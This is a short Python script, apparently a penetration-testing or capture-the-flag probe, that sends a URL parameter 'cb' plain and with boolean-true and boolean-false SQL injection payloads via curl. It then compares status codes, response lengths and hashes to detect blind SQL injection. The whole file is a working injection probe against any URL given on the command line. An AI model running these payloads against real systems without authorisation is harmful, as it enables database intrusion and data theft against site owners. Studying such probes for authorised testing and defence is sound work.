import subprocess, hashlib, time, sys
url = sys.argv[1]
pairs = [
    ["cb=1", "cb=1' AND 1=1-- -", "cb=1' AND 1=2-- -"] * 3,
]
def get(url, param):
    r = subprocess.run(['curl','-s','-G',url,'--data-urlencode',param,'-w','\n__CODE__%{http_code}'],
                       capture_output=True, text=True)
    o = r.stdout
    code = o.rsplit('__CODE__',1)[-1].strip()
    body = o.rsplit('__CODE__',1)[0]
    return code, len(body), hashlib.sha256(body.encode()).hexdigest()[:10]
for grp in pairs:
    for p in grp:
        c,l,h = get(url,p)
        print(f"{c} len={l} hash={h}  <- {p}", flush=True)
        time.sleep(1.2)